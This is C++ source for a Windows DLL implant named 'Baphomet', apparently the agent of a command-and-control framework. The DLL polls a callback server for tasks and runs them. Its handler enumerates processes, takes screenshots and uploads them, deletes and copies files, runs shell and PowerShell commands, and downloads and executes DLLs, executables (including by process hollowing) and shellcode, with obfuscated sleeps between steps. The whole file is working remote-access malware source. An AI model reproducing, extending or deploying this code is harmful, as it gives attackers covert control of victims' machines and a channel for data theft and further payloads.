#include "main.hpp"
#pragma comment(lib,"winhttp.lib")

#define BAPHOMET_DEBUG

#ifdef BAPHOMET_DEBUG
    #include <iostream>
#endif

//
// for testing purposes
//
bool read_from_disk(const std::string& file_name, std::string& outbuff) {

    HANDLE hFile = CreateFileA(
        file_name.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD file_size = GetFileSize(hFile, nullptr);
    if(file_size == INVALID_FILE_SIZE) {
        return false;
    }

    outbuff.resize(file_size);
    DWORD bytesread = 0;
    if(!ReadFile(
        hFile,
        outbuff.data(),
        file_size,
        &bytesread,
        nullptr
    ) || bytesread != file_size) {
        return false;
    }

    CloseHandle(hFile);
    return true;
}


std::string
format_output(const std::string& str) {
    return std::string("\"\n") + (str + '\"');
}


command_output
process_command(
        _In_ const std::string& command_str,
        _In_ const char delimeter,
        _In_ const implant_context& ctx
    ) {

    std::vector<std::string> args;
    size_t start            = 0;
    size_t next_delimeter   = command_str.find(delimeter);

    while(next_delimeter != std::string::npos) {
        if(next_delimeter > start) {
            args.push_back(command_str.substr(start, next_delimeter - start));
        }

        start = next_delimeter + 1;
        next_delimeter = command_str.find(delimeter, start);
    }

    if(args.empty()) {
        return { format_output("Invalid command."), nullptr, output_type::PLAIN_TEXT };
    }


#ifdef BAPHOMET_DEBUG
    std::cout << "[+] Command chunks:" << std::endl;
    for(size_t i = 0; i < args.size(); i++) {
        std::cout << " - " << args[i] << std::endl;
    }
#endif

    //
    // gonna just stick with the simplest way of doing this, no std::map or anything.
    // takes up more LOC, but less things to statically link, so smaller payload size.
    // plus, arguably more readable.
    //

    const std::string cmd_name = args[0];

    if(cmd_name == "pwd") {
        return { format_output(tasking::pwd()), nullptr, output_type::PLAIN_TEXT };
    }

    if(cmd_name == "cd") {
        return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "ls") {
        return { format_output(tasking::ls()), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "cat") {
        return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "procenum") {
        return { format_output(recon::enumerate_processes()), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "whoami") {
        return { format_output(recon::whoami()), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "rm") {
        return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "mkdir") {
        return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "cp") {
        return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "ps") {
        return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "cmd") {
        return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
    }

    if (cmd_name == "screenshot") {
        HANDLE hscreenshot = recon::save_screenshot();
        if(hscreenshot == nullptr) {
            return {"Failed to save screenshot.", nullptr, output_type::PLAIN_TEXT };
        }

        return {"", hscreenshot, output_type::FILE};
    }


    if(cmd_name == "rundll") {
        obfus::sleep(ctx.sleep_time);
        std::string dll_file;

        if(!networking::recieve_file(
            ctx.hconnect,
            ctx.callback_object,
            args[1],
            ctx.session_token,
            ctx.is_https,
            dll_file
        )) {
            return {
                format_output("Failed to download specified DLL: " + args[1]),
                nullptr,
                output_type::PLAIN_TEXT
            };
        }

        return {
            format_output(tasking::rundll(dll_file)),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }


    if(cmd_name == "runexe") {
        obfus::sleep(ctx.sleep_time);
        std::string exe_file;

        if(!networking::recieve_file(
            ctx.hconnect,
            ctx.callback_object,
            args[1],
            ctx.session_token,
            ctx.is_https,
            exe_file
        )) {
            return {
                format_output("Failed to download specified executable: " + args[1]),
                nullptr,
                output_type::PLAIN_TEXT
            };
        }

        return {
            format_output(tasking::runexe(args[2] == "hollow", exe_file)),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }


    if(cmd_name == "runshellcode") {
        obfus::sleep(ctx.sleep_time);
        std::string shellcode_buff;

        if(!networking::recieve_file(
            ctx.hconnect,
            ctx.callback_object,
            args[1],
            ctx.session_token,
            ctx.is_https,
            shellcode_buff
        )) {
            return {
                format_output("Failed to download shellcode: " + args[1]),
                nullptr,
                output_type::PLAIN_TEXT
            };
        }

        return {
            format_output(tasking::run_shellcode(GetCurrentProcessId(), shellcode_buff)),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }

    if(cmd_name == "runbof") {
        return { format_output("unimplimented"), nullptr, output_type::PLAIN_TEXT };
    }

    return { format_output("Unknown command."), nullptr, output_type::PLAIN_TEXT };
}


bool
recieve_commands(implant_context& ctx) {

    std::string task;

    auto _ = defer([&]() {
       if(ctx.hsession != nullptr) {
           WinHttpCloseHandle(ctx.hsession);
       }
        if(ctx.hconnect != nullptr) {
            WinHttpCloseHandle(ctx.hconnect);
        }
    });

    if(!networking::open_session(ctx.hsession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
        return false;
    }

    if(!networking::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, ctx.hsession, ctx.hconnect)) {
        return false;
    }

    while(true) {
        obfus::sleep(ctx.sleep_time);

        task.clear();
        if(!networking::send_object_message(
            ctx.hconnect,
            ctx.callback_object,
            "get_task",
            ctx.session_token,
            ctx.is_https,
            task
        )) {
            #ifdef BAPHOMET_DEBUG
                std::cout << "[*] no task." << std::endl;
            #endif
            continue;
        }

        if(task == (std::string("die") + COMMAND_DELIMITER) ) {
            break;
        }

        #ifdef BAPHOMET_DEBUG
            std::cout << "[+] recieved task: " << task << std::endl;
        #endif


        auto [txt_output, file_to_upload, type] = process_command(task, COMMAND_DELIMITER, ctx);
        obfus::sleep(ctx.sleep_time);

        bool success = false;
        if(type == output_type::PLAIN_TEXT) {

            #ifdef  BAPHOMET_DEBUG
                std::cout << "[+] Sending response:\n" << txt_output << std::endl;
            #endif

            success = networking::send_object_message(
                ctx.hconnect,
                ctx.callback_object,
                "complete_task --result " + txt_output,
                ctx.session_token,
                ctx.is_https,
                task
            );
        }

        if(type == output_type::FILE) {
            success = networking::upload_file(
                ctx.hconnect,
                ctx.callback_object,
                file_to_upload,
                ctx.session_token,
                ctx.is_https
            );
        }

        #ifdef BAPHOMET_DEBUG
            if(success) {
                std::cout << "[+] Successfully sent response to: " << ctx.callback_object << std::endl;
            } else {
                std::cout << "[!] Failed to send response!" << std::endl;
            }
        #endif
    }

    #ifdef BAPHOMET_DEBUG
        std::cout << "[+] Exiting..." << std::endl;
    #endif

    return true;
}


BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {

    std::cout << "Made it past reflective setup." << std::endl;

    implant_context ctx;
    ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
    ctx.session_token = "NjR2QnZ5dEY1QmRScUoybE9odEpzd0ZFTw==";
    ctx.server_addr = "127.0.0.1";
    ctx.port = 8081;
    ctx.is_https = false;
    ctx.user_agent = "test program/1.0";
    ctx.sleep_time = 2500;
    ctx.jitter = 0;

    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            std::cout << "we are so attached. starting..." << std::endl;
            if(!recieve_commands(ctx)) {
                std::cout << "FAILED!" << std::endl;
                return FALSE;
            }
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }


    return TRUE;
}
